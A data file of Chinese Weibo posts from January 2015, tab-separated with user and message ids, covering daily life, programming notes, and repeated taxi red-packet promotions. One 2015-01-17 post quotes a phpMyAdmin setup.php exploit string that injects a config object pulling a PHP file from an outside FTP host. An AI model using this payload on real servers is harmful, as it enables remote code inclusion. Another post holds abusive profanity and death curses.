uid	mid	time	content
17cfa18c10bc9df3417dac949b5b8e78	6adb808f7cdacb4d9644ae1a7bdef632	2015-01-06	database no datebase 我分享了http://t.cn/RZcHE0a
17cfa18c10bc9df3417dac949b5b8e78	e0cdada570b924a7a7a16f013efbd429	2015-01-29	@百度地图  真心渣啊渣啊渣 一个好好的路痴 妈蛋被你们直接带进了异次元 幸好还有腾讯地图
a3b997e77b242a74af6b5d2f9f654a1b	221f4eb6c2fcbd2e33e6b1bd6dfebed7	2015-01-14	【北京长安街车祸致1人死 5车相撞现场一片狼藉】 (分享自 @今日头条 ) 黄金栅栏呢？ http://t.cn/RZKGIoT
a3b997e77b242a74af6b5d2f9f654a1b	09569293eb201a7f06592d30a6d09191	2015-01-15	还有这么一个软件协议 WTFPL http://t.cn/zTQwVPx
a3b997e77b242a74af6b5d2f9f654a1b	f9c60ccebaad44c9e89dce45455b600f	2015-01-23	再也不想谈框架了
a3b997e77b242a74af6b5d2f9f654a1b	0662e3c0f3a47a010f4529897ff49ada	2015-01-29	隐隐的感觉某boss陷入了一个误区，过分害怕新技术，不敢使用“新”技术。
2d6557a974cd2be395b1e8e7e337d209	62e8323aafaeb8d1ee312c8bfc988bdb	2015-01-01	猪肉大葱馅饼，我的最爱之一 //《温州老板娘的葱香馅饼教程》 - http://t.cn/RZ45iSL  … @豆瓣一刻APP
2d6557a974cd2be395b1e8e7e337d209	062b06003316cf8d803b1074c7873355	2015-01-04	分享图片
2d6557a974cd2be395b1e8e7e337d209	4191a4e3660d7e51146b20b5d45977ac	2015-01-05	csdn.net 账户有漏洞，注意liao！~
2d6557a974cd2be395b1e8e7e337d209	5b94d822912db7605d67419424b60a71	2015-01-08	等了三年又三天...——评论@邻居的耳朵网站 「【行走时光】Vol.2 喜欢，有何不可」http://t.cn/RZcGopc
2d6557a974cd2be395b1e8e7e337d209	34119f64aac435ac21cfe9b0076baf86	2015-01-08	“为嘛朋友圈中的文青的一天是从一杯咖啡开始，而我是从一泡尿开始的呢……”（via 局长）
2d6557a974cd2be395b1e8e7e337d209	66cfa2c92782bd7fe0929c7ddf036aa5	2015-01-17	分享图片
2d6557a974cd2be395b1e8e7e337d209	fd07b21a3937170576bde18c306a98f3	2015-01-17	【spm code】112.124.37.234/phpmyadmin/scripts/setup.php Match1:/phpmyadmin/scripts/ Match2:setup.php Match3:&action=lay_navigation&eoltype=unix&token=&configuration=a:1:{i:0;o:10:.pma_config.:1:{s:6:.source.;s:28:.ftp://37.59.68.30/pub/44.php.;}}
2d6557a974cd2be395b1e8e7e337d209	be4e39ceae40169e47ad38e852306c7a	2015-01-18	《可爱的三人午睡派对》 - http://t.cn/RZp89MZ  … @豆瓣一刻APP
2d6557a974cd2be395b1e8e7e337d209	50fb4e648f1e5362638e780e07a304fb	2015-01-18	不得不说golang是我的未来.
2d6557a974cd2be395b1e8e7e337d209	6128837c0a2c1bb8f02d577069adf61c	2015-01-20	{% load newlalest_art %}  and  {{ values | filter_distinct }}
2d6557a974cd2be395b1e8e7e337d209	87042139791c019c4100ab9b89ab1012	2015-01-22	weibo share demo by python api 2.0 ... http://t.cn/RZYItHz
2d6557a974cd2be395b1e8e7e337d209	70e69401d03e045dab40e35b93817d25	2015-01-23	《有一种热情叫做包饺子》 - http://t.cn/RZHKogS  … @豆瓣一刻APP
2d6557a974cd2be395b1e8e7e337d209	c917119a1eacd616310a4200ea3bbe6a	2015-01-24	使用 Gogs 搭建私有 Git 代码托管服务 http://t.cn/RZQOZCl
2d6557a974cd2be395b1e8e7e337d209	322f0883a0aa45a86874e4020e43a84d	2015-01-24	Django 1.7 开发之 - 初始介绍及基本环境搭建 http://t.cn/RZQOLYN
2d6557a974cd2be395b1e8e7e337d209	bcef39c8aaa3bc2e2387fd4dc33e99b6	2015-01-24	Django 1.7 开发之 - Settings.Py 功能介绍及 Models 实例 http://t.cn/RZQOx1t
2d6557a974cd2be395b1e8e7e337d209	661a758eb8bc670284e7ebc5d4878fcb	2015-01-25	我正在学习PostgreSQL 性能优化，收获巨大哦，一起来学习吧！ http://t.cn/RZ81kcu
2d6557a974cd2be395b1e8e7e337d209	4e77f9013809b9dc893dce8b8eed37ce	2015-01-26	Python [PIL ImageOps]  Invert, Posterize, Solarize   http://t.cn/RZnLheZ (来 @土豆 订阅我的自频道 http://t.cn/RZnLheT )
2d6557a974cd2be395b1e8e7e337d209	4f86fd1db25a3c1441c78d0fe69d77ad	2015-01-27	发现现在安装个app到处都是坑，今天更新了一下@乐视 app，从开始安装到进去首页，期间安装过程捆绑了多个垃圾应用  --- 应用宝，搜狗的号码什么玩意。。。  不容易啊，好在算是都让过去了。[睡觉]
2d6557a974cd2be395b1e8e7e337d209	995a0cfb324623bbba0bd4e4c46d3fc5	2015-01-27	《寒假撸剧第一波｜偏文化、历史欧美剧集》 - http://t.cn/RZRhwss  … @豆瓣一刻APP
2d6557a974cd2be395b1e8e7e337d209	9cd8046d6e1414e1085a473aa9d90dc1	2015-01-28	弱弱的问一句: 2月份中的厦门需要穿羽绒服吗？
5552f6b519133692c9ef7d7dd90fe737	d957c6a060ed54f6b763ecc779b8559c	2015-01-22	我发表了文章 http://t.cn/RZYdXgj
5552f6b519133692c9ef7d7dd90fe737	ce219d70de593e48a8a021c3c8d5f683	2015-01-29	#一起发红包吧#人品！这就是人品！我在@来去之间 的红包中抽到了“3.7元现金”！你们也来抢呀！http://t.cn/Rzkx7F7
9ca96aaa48a0a775135e11df6667ae18	ebe3af0d0d8e6b75e680f5da8385a860	2015-01-01	#快的打车红包# @快的打车 ，百发百中！打车就送66个大红包任你抢！有钱，任性！什么，你说太热门抢不到？自己打车你也有！要抢点这里http://t.cn/RZbwdAV
9ca96aaa48a0a775135e11df6667ae18	57552a9dedd0dd76d08511eaa0b8724b	2015-01-05	#快的打车红包# 人间自有真情在，他人断奶别无奈，相信快的是真爱！Ze天挺住！ 3000W坚挺红包暖心陪伴，@快的打车 一路挺你！ 要抢点这里http://t.cn/RZc8qjp
9ca96aaa48a0a775135e11df6667ae18	674a9180b04b3cbdbc0fcd6000d1c6cb	2015-01-07	#快的打车红包# 人间自有真情在，他人断奶别无奈，相信快的是真爱！Ze天挺住！ 3000W坚挺红包暖心陪伴，@快的打车 一路挺你！ 要抢点这里http://t.cn/RZfPmgz
9ca96aaa48a0a775135e11df6667ae18	1429a16d2f3d177107e297329ca433cc	2015-01-07	#快的打车红包# 人间自有真情在，他人断奶别无奈，相信快的是真爱！Ze天挺住！ 3000W坚挺红包暖心陪伴，@快的打车 一路挺你！ 要抢点这里http://t.cn/RZfPmgz
9ca96aaa48a0a775135e11df6667ae18	42805f0f93d7b8a01e82d43bcb4ddf8e	2015-01-08	#快的打车红包# 人间自有真情在，他人断奶别无奈，相信快的是真爱！Ze天挺住！ 3000W坚挺红包暖心陪伴，@快的打车 一路挺你！ 要抢点这里http://t.cn/RZxblux
9ca96aaa48a0a775135e11df6667ae18	e2e14063b640f685afbba99a3f5a2426	2015-01-13	#快的打车红包#「快财神」送头彩啦！欢庆快的打车市场份额稳居第一！10个城市9个快，10张订单9张快，做快乐的大多数，打车就送超大红包！@快的打车 即刻领红包：http://t.cn/RZSstQs
ffeaea408edaab9fd486aac63658824c	d300a0a8dcb1a69a4af49e0652e6c105	2015-01-30	已经持续两天了忍无可忍！高德你们家官网打开要靠运气，下载API开发工具完全没速度马云知道吗？偌大的官网用个Wordpress我都就不吐槽了，实在不行麻烦分流一下谢谢。 @高德地图
a15de9f3d100a85747b59eba86acc609	0d67d863dd45c0b6982a17a1ce6f313d	2015-01-27	顶！推荐大家观看：【视频：【TED出品】直播秀之2V2高分段匹配系列6 infi】 http://t.cn/RZEq0xH （分享自 @优酷）
d408bea873524a60d2f644b1443197f5	b41211d709cdd41c7e92ca3e026cc565	2015-01-01	流B不? http://t.cn/RZbhTqh
d408bea873524a60d2f644b1443197f5	b7854494be3e8031195c70c30d843ee8	2015-01-06	路漫漫其修远兮，吾依然坐地铁矣！ http://t.cn/RzUPHLu
d408bea873524a60d2f644b1443197f5	bb9b7e99f2770628ca3f8f09daa7f978	2015-01-06	路漫漫其修远兮，吾依然坐地铁矣！ http://t.cn/z8p80Ab
d408bea873524a60d2f644b1443197f5	477a8420ac810721d3f4a29321a9422e	2015-01-06	哥的作品
d408bea873524a60d2f644b1443197f5	96fc7754b9f8c878795971ea3fe32007	2015-01-10	一般情况下，我还是比较慷慨的，拿10斤脂肪换取再长高5公分这事我还是愿意干的！
d408bea873524a60d2f644b1443197f5	e63867a3801fe44bd3036e6296907365	2015-01-10	自从一健Root后，卸载了一些预装的杂七杂八的APP，感觉手机快多了，而且待时间还涨的噌噌的~~~~~
d408bea873524a60d2f644b1443197f5	9677d56723f3989db131db470d34f869	2015-01-20	大学的同学们，头发都去哪里了？快告诉哥！ http://t.cn/8k6qJCg
d408bea873524a60d2f644b1443197f5	5f58c266921a8d8966541edc940a2f9d	2015-01-21	年底了，虽然回去的票没着落，不过心却早已坐高铁回去了！咋整？ http://t.cn/z86XB8o
d408bea873524a60d2f644b1443197f5	10219db170efb39f7dc91ab71bce4830	2015-01-22	要是可以销掉微博帐号就好了！[顶]
d408bea873524a60d2f644b1443197f5	c9e400e01230085c618bd07bd35bdb29	2015-01-22	要是冬天都可以坚持每天早起跑步，那毅力得多强啊！对这种人佩服的不得了
d408bea873524a60d2f644b1443197f5	ac886101ea137cc2382ae3cbc71e72c9	2015-01-22	又饱又饿是啥感觉？ http://t.cn/z8A45z9
d408bea873524a60d2f644b1443197f5	55790d426b74988ecbd79f83436357d5	2015-01-31	2015愿望：不折腾、不作！ http://t.cn/8kRROd9
76c50730872838427243fcd03910cf23	c96e70e31d46260d86fab4de65a2cffb	2015-01-28	明显瞎掰，你想怎么可能用行政命令划定市场区域呢？ //【从南北车合并看政府管理企业的简单与粗暴】http://t.cn/RZ3lcBz (分享自 @今日头条)
0b5047878eaab88110d5f04216d58458	256cc2e7a1dd11a11fbfeb61b8b22b50	2015-01-05	How to JIT - an introduction http://t.cn/8kE6r3U
1d02421611d13812d23595510d7898a7	dce2bfe92ead03f50a430acd3406d0c9	2015-01-13	#快的打车红包# 人间自有真情在，他人断奶别无奈，相信快的是真爱！Ze天挺住！ 3000W坚挺红包暖心陪伴，@快的打车 一路挺你！ 要抢点这里http://t.cn/RZSbJqA
6317f979e863fb950aec37f5e3590474	6fcc399e90f02c8021a40ea8710bfb62	2015-01-16	刚登录#蜻蜓FM# // 终于找到fm神器了，内容爆多，新闻，小说，音乐，相声，脱口秀……想听啥都有，关键还有3000多家电台24小时不间断直播，快去把它收了吧→http://t.cn/S6fTEd（分享自@蜻蜓FM）
a27f5b86393f11a289abce609db957fd	54aa495504c6243e4a3681b53554e8e0	2015-01-09	一号专车 开运上上签 http://t.cn/RZJiWZV
a27f5b86393f11a289abce609db957fd	333e6f809d5dbbc37e2f170d81517070	2015-01-12	http://t.cn/RZMCF21
a27f5b86393f11a289abce609db957fd	c5f46b738b4c8110889d9d302cce0eab	2015-01-15	向后看自己的行程，向前看自己的梦想。
a27f5b86393f11a289abce609db957fd	053ae6bd862982d4695c975eaeec3c51	2015-01-23	#快的打车红包#「快的小财神」送头彩啦！欢庆快的打车市场份额稳居第一！10个城市9个快，10张订单9张快，做快乐的大多数，打车就送超大红包！@快的打车 即刻领红包：http://t.cn/RZTma84
a27f5b86393f11a289abce609db957fd	7c62500e2c1f68160ebe45713f1af4ba	2015-01-23	#快的打车红包#「快的小财神」送头彩啦！欢庆快的打车市场份额稳居第一！10个城市9个快，10张订单9张快，做快乐的大多数，打车就送超大红包！@快的打车 即刻领红包：http://t.cn/RZTma84
a27f5b86393f11a289abce609db957fd	14168fa63a7b7ccaecc58da859ed6fe9	2015-01-23	#快的打车红包#「快的小财神」送头彩啦！欢庆快的打车市场份额稳居第一！10个城市9个快，10张订单9张快，做快乐的大多数，打车就送超大红包！@快的打车 即刻领红包：http://t.cn/RZHR1as
021bdabdef395a6906a435bdcece1217	0f79b8a11a3a719819fcf3e6e78c92f5	2015-01-01	Google 出品的 Year in Search 2014 真心 Amazing 啊！来自 Porter Robinson 的 Divinity 作为 Soundtrack 真心 Amazing~ 推荐一个~ http://t.cn/RzmP37T
021bdabdef395a6906a435bdcece1217	3b4b85c31229625ec319a067ef10ca42	2015-01-03	渐渐地，我开始明白，你永远做不到与理想百分百相似的模样，既然走不到画中，就把那份执念轻轻放下，以欣赏的姿态目送，因为完整的人生需要完美和不完美同时存在。
021bdabdef395a6906a435bdcece1217	3b40f0a9a6804fd72f074ade9c749afc	2015-01-03	有时候我真宁愿自己完全不懂编程，也不懂网络，至少也不至于现在如此纠结，这感觉实在是太不好了！
021bdabdef395a6906a435bdcece1217	f7ad3107fe17939f9d65f51272e0e876	2015-01-04	Give me release. Let the waves of time and space surround me. Yeah. Cause I need room to breathe. Let me float back to the place you found me. I'll be okay ~Via http://t.cn/zWNnu00
021bdabdef395a6906a435bdcece1217	a0d4cc5f6e649c24ed64910366d2be4e	2015-01-05	Give me release. Let the waves of time and space surround me. Yeah. Cause I need room to breathe. Let me float back to the place you found me. I'll be okay ~Via http://t.cn/zWhsMbO
021bdabdef395a6906a435bdcece1217	44edad07e707675518dfb941fae56b93	2015-01-06	假如你爱我，就会为了我如此这般那般 Via http://t.cn/RzPaqCm ~写得很明白，真心的。早点学会便不至于怀着期待，却最后只得到一个心理的落差，苦了自己也难为了别人。
021bdabdef395a6906a435bdcece1217	57e048f68e7b251e2333cf830b2d9ab7	2015-01-09	蛋疼到，连Google的secondFactor的验证码都收不到了！还好老子保存了10个备用的验证码！这天朝是要打算完全毙掉Google的节奏啊！以前的GFW还只是个IDS，发现敏感信息就拦截而已；现在的GFW，还真是完完全全地屏蔽IP啊！操你妈全家！深夜诅咒建GFW那帮人统统死全家！操！操！操你妈逼！
021bdabdef395a6906a435bdcece1217	932622edb593310cdc8a75e3922584e3	2015-01-09	这首音乐，适合开一盏微弱的灯光，一个人安静地坐着，用整夜的时间来听。仿佛所有的忧伤与悲哀都被音乐引导出来。跟着音乐缓缓的曲调，深陷在悲伤的情绪里不能自已。恍惚里，无所依靠，在宇宙中飘飘悠悠，夜空墨黑，飘荡的灵魂该去往何方？Via http://t.cn/RZxcECa ~忽然想起的一首歌，晚安
021bdabdef395a6906a435bdcece1217	bed38983a8c4a6716d5e22ec8fd39c4f	2015-01-11	大量访问下的数据统计能说明很多事实的，至少是颠覆了我对地方社区网站的理解。真的，你不能想象所有人都跟你一样，你只是少数！
021bdabdef395a6906a435bdcece1217	95f2d9f295644469cd464e55025cf3b5	2015-01-12	pyspider 果真是可视化爬虫中的神器。写几个task 每五分钟抓取一次本地网站的所有信息，用 elasticseach 索引一下就能建立个本地化的近乎实时的搜索引擎了。全自动实现，完全不用人工干预！唯一需要考虑一下的就是有足够的 IP、带宽和磁盘空间了！
021bdabdef395a6906a435bdcece1217	a6995b252204d8695ca9070364702b07	2015-01-13	你自己想要的未来，还需要你去努力成全。阴雨两天后的阳光，真好。
021bdabdef395a6906a435bdcece1217	fa20f21504436305603a461723fd7e2d	2015-01-13	调教spider，没有必要一上来就把目光放在你看到的网页上，其实桌面浏览器的页面广告又多，需要下载的数据也大，换种方式，抓取手机版的页面就好很多！注意一下要抓取站点的手机站点是如何接入的就好，Discuz系列都是靠判断User-Agent的，有点还自带wap.example.com这样子域名的。
021bdabdef395a6906a435bdcece1217	f5173497f75518a7711d35e9c9a1dce0	2015-01-15	哇啦啦流淌的数据，看着真心舒服，花几个小时就爬完别人全站的数据了，那酸爽。嗯嗯，要好好用这些数据做点有意义的事情，要相信数据背后的价值。
021bdabdef395a6906a435bdcece1217	94c1f857e4aaadd6b9eb51fc5c430ecf	2015-01-18	买个房被坑送的东西没有写合同里，后来人家不送了！买个车人家活生生地将官方指导价拿来计算汽车购置税，然后各种错漏百出的商业保险！想好好做个单纯的人，却处处逼我做个恶人，买一样东西就成一样东西的专家，不能停歇的撕逼一样的战斗，不能被原谅的充满算计的社会，好累。
021bdabdef395a6906a435bdcece1217	1a57c880511c8b638d1424142e2567f4	2015-01-20	不知道未来会怎么样，也不知道能走向哪里。每天我只是努力一点点，每一个细节去完善，每一点内容去增加。抱着最好的希望去做好今天的事情。
021bdabdef395a6906a435bdcece1217	d2ddefe5cc371a392a6eda0003a25d84	2015-01-22	虽然各种浏览器百花齐放，各种牛逼的HTMLn和CSSn充满各大技术blog，但不得不承认，IE6的分量之高，远超你能想象的程度。不要去看百度data的统计，也不看什么统计机构的统计数据，就我手中的数据看来，IE6的分量远超80%。这个数据让我好无语，也好无奈。
021bdabdef395a6906a435bdcece1217	49438c423ec7045a75a876342ca77ba9	2015-01-22	时不时翻翻服务器上的log，敢情这世界的扫描器还真是多啊，各种乱七八糟的扫描，一堆iptables denied多到我都看不下去了！还有各种针对SSH的暴力破解，在iptables增加条规则，1分钟内新建连接不能超过3次，1小时内新建连接不能超过5次。实在是好无语，怎么这么多无聊的人。
021bdabdef395a6906a435bdcece1217	18b60e04a169785599a14b9588f1c21b	2015-01-23	用了一下 weixin.sogou.com 来翻了一下本地的微信公众号，泥马的不看不知道，一看吓一跳，果真是天下文章一大抄么？！好无语啊！这个抄那个，那个抄这个！在我只有37个人关注的微信公众号中都能找到抄袭者，我是真心很无语！
021bdabdef395a6906a435bdcece1217	698190a11cc7d95141eaddcba238b64e	2015-01-23	Tornado中使用post提交内容，self.get_argument竟然是无法获取页面URL的参数的！最典型例子就是使用@tornado.web.authenticated的装饰器，无法调整到传入的next参数跳转到next指向的页面啊！神伤！我竟然错误地理解这个这么久，伤心！
